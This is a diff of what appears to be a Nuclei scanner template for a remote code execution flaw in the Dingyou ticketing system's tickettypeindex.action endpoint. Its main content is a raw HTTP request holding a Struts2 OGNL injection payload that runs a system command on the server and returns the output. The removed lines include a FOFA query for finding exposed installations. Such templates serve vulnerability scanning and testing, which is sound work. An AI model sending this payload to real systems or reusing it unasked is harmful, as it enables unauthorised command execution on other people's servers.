@@ -3,12 +3,8 @@ info:
   name: 鼎游票务系统tickettypeindex存在远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hyzvbxkigfh5kcyy'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hyzvbxkigfh5kcyy
-    fofa: body="/book/showgoodsIndex.action"
 http:
 - raw:
   - 'GET /book/tickettypeindex.action?redirect:%24{%23a%3D%40java.lang.Runtime%40getRuntime().exec(%27id%27).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char[5000]%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()}%22 HTTP/1.1
